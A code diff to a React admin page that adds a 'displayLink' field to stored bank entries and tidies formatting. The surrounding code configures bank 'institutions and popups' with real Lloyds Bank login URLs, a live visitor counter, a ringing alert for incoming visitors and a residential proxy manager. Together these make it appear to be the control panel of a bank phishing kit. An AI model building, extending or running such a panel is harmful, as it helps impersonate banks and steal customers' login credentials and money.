@@ -38,6 +38,9 @@ export default function AdminPage() {
   const [logoBase64, setLogoBase64] = useState<string | null>(null);
   const [order, setOrder] = useState<any>(1);
   
+  // 🔥 Display Link State Added
+  const [displayLink, setDisplayLink] = useState("");
+  
   // 🌍 Category-wise URL States & Checkboxes
   const [personalUrl, setPersonalUrl] = useState("https://authorise.lloydsbank.co.uk/auth/user");
   const [businessUrl, setBusinessUrl] = useState("https://www.lloydsbank.co.uk/business.html");
@@ -195,9 +198,7 @@ export default function AdminPage() {
     reader.readAsDataURL(file);
   };
 
-
-
-const handleStartEdit = (bank: any) => {
+  const handleStartEdit = (bank: any) => {
     setEditingBankId(bank.id);
     setBankName(bank.name);
     setSubtitle(bank.subtitle || "");
@@ -205,12 +206,12 @@ const handleStartEdit = (bank: any) => {
     setLogoBase64(bank.logoUrl || null);
     setOrder(bank.order !== undefined ? Number(bank.order) : 1);
     
-    // 🌍 Bank ke apne configured URLs set karna (fallback empty rakhein agar na ho)
+    // 🔥 Load Display Link & URLs
+    setDisplayLink(bank.displayLink || "");
     setPersonalUrl(bank.personalUrl || "");
     setBusinessUrl(bank.businessUrl || "");
     setCommercialUrl(bank.commercialUrl || "");
     
-    // 🟩 Checkbox states properly load karna
     setEnablePersonal(bank.enablePersonal ?? true);
     setEnableBusiness(bank.enableBusiness ?? true);
     setEnableCommercial(bank.enableCommercial ?? true);
@@ -218,7 +219,7 @@ const handleStartEdit = (bank: any) => {
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
 
-const handleSubmitBank = async (e: React.FormEvent) => {
+  const handleSubmitBank = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!bankName.trim()) return alert("Bank name is required");
     setIsSubmitting(true);
@@ -229,6 +230,7 @@ const handleSubmitBank = async (e: React.FormEvent) => {
         subOptions: subOptions.trim(),
         logoUrl: logoBase64 || null,
         order: Number(order) || 1,
+        displayLink: displayLink ? displayLink.trim() : null, // 🔥 Included in payload
         personalUrl: personalUrl ? personalUrl.trim() : null,
         businessUrl: businessUrl ? businessUrl.trim() : null,
         commercialUrl: commercialUrl ? commercialUrl.trim() : null,
@@ -261,6 +263,7 @@ const handleSubmitBank = async (e: React.FormEvent) => {
       setIsSubmitting(false);
     }
   };
+
   const handleCancelEdit = () => {
     setEditingBankId(null);
     setBankName("");
@@ -268,6 +271,7 @@ const handleSubmitBank = async (e: React.FormEvent) => {
     setSubOptions("Business, Personal, Corporate");
     setLogoBase64(null);
     setOrder(banks.length + 1);
+    setDisplayLink(""); // 🔥 Reset Display Link
     setPersonalUrl("https://authorise.lloydsbank.co.uk/auth/user");
     setBusinessUrl("https://www.lloydsbank.co.uk/business.html");
     setCommercialUrl("https://www.lloydsbank.co.uk/commercial.html");
@@ -276,7 +280,6 @@ const handleSubmitBank = async (e: React.FormEvent) => {
     setEnableCommercial(true);
   };
 
- 
   const handleDeleteBank = async (id: string) => {
     if (!confirm("Are you sure you want to delete this institution?")) return;
     try {
@@ -483,9 +486,7 @@ const handleSubmitBank = async (e: React.FormEvent) => {
           </div>
         )}
 
-    
-
-<header className="h-16 bg-[#141418] border-b border-zinc-800 flex items-center justify-between px-8 shrink-0">
+        <header className="h-16 bg-[#141418] border-b border-zinc-800 flex items-center justify-between px-8 shrink-0">
           <div className="flex items-center gap-4">
             <h2 className="text-sm font-semibold text-zinc-200 uppercase tracking-wide">
               {activeTab === "institutions" && "Institutions & Popups Configuration"}
@@ -495,7 +496,6 @@ const handleSubmitBank = async (e: React.FormEvent) => {
               {activeTab === "proxy" && "GenLogin Residential Proxy Manager"}
             </h2>
 
-            {/* 🟢 Live Active Visitors Badge */}
             <div className="hidden md:flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1 rounded-full">
               <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
               <span className="text-[11px] font-bold text-emerald-400">
@@ -505,7 +505,6 @@ const handleSubmitBank = async (e: React.FormEvent) => {
           </div>
           
           <div className="flex items-center gap-3">
-            {/* 🔔 Notification Settings & Sound Dropdown */}
             <div className="flex items-center gap-2 bg-zinc-900 px-3 py-1.5 rounded-xl border border-zinc-800 text-xs">
               <span className="text-zinc-400 font-medium flex items-center gap-1">🔔 Tone:</span>
               <select 
@@ -531,7 +530,6 @@ const handleSubmitBank = async (e: React.FormEvent) => {
                 value={ringDurationSeconds}
                 onChange={(e) => setRingDurationSeconds(Number(e.target.value))}
                 className="w-12 bg-zinc-950 border border-zinc-700 text-zinc-100 text-center rounded-lg py-0.5 outline-none font-bold"
-                title="0 for continuous ringing until stopped"
               />
               <button
                 type="button"
@@ -561,9 +559,6 @@ const handleSubmitBank = async (e: React.FormEvent) => {
           </div>
         </header>
 
-
-
-
         <main className="flex-1 overflow-y-auto p-8 bg-[#0a0a0c]">
           {activeTab === "institutions" && (
             <InstitutionsTab
@@ -575,6 +570,8 @@ const handleSubmitBank = async (e: React.FormEvent) => {
               setSubtitle={setSubtitle}
               subOptions={subOptions}
               setSubOptions={setSubOptions}
+              displayLink={displayLink}
+              setDisplayLink={setDisplayLink}
               logoBase64={logoBase64}
               setLogoBase64={setLogoBase64}
               order={order}
